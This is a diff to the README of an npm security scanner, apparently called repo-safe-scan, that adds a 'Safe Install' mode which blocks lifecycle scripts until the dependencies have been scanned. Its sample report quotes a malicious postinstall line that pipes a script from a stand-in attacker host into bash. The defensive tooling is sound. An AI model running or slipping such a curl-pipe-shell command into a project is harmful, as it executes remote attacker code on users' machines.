@@ -35,7 +35,39 @@ npx repo-safe-scan /path/to/repo
 
 ---
 
+## 🛡 Safe Install (Prevention Mode)
+
+**This is the killer feature.** Instead of scanning after the damage is done, use `repo-safe-install` to **prevent** malicious scripts from ever running:
+
+```bash
+repo-safe-install
+```
+
+What happens under the hood:
+
+| Step | Command | Purpose |
+|------|---------|---------|
+| 1 | `npm install --ignore-scripts` | Download packages **without** executing lifecycle hooks |
+| 2 | `repo-safe-scan --include-node-modules` | Scan all dependencies for malicious patterns |
+| 3 | `npm rebuild` *(only if scan passes)* | Run lifecycle scripts now that they're verified safe |
+
+If the scan detects critical or high severity threats → **install is blocked**, scripts never execute, and you get a full report of what was found.
+
+```
+  ╔══════════════════════════════════════════════╗
+  ║  ✖  INSTALL BLOCKED — threats detected       ║
+  ╚══════════════════════════════════════════════╝
+
+  ✖  LIFECYCLE  curl-pipe-shell
+    node_modules/evil-pkg/package.json → postinstall
+    curl http://evil.example.com/payload.sh | bash
+```
+
+---
+
 ## Usage
+
+### Scanning (Detection)
 
 ```bash
 repo-safe-scan [path] [options]
@@ -165,7 +197,8 @@ npm start -- .
 ```
 repo-safe-scan/
 ├── bin/
-│   └── cli.ts               # CLI CLI orchestration & output rendering
+│   ├── cli.ts               # CLI orchestration & output rendering
+│   └── safe-install.ts      # 🛡 repo-safe-install prevention wrapper
 ├── src/
 │   ├── scanner.ts           # Core orchestrator 
 │   ├── scoring.ts           # Risk Score logic
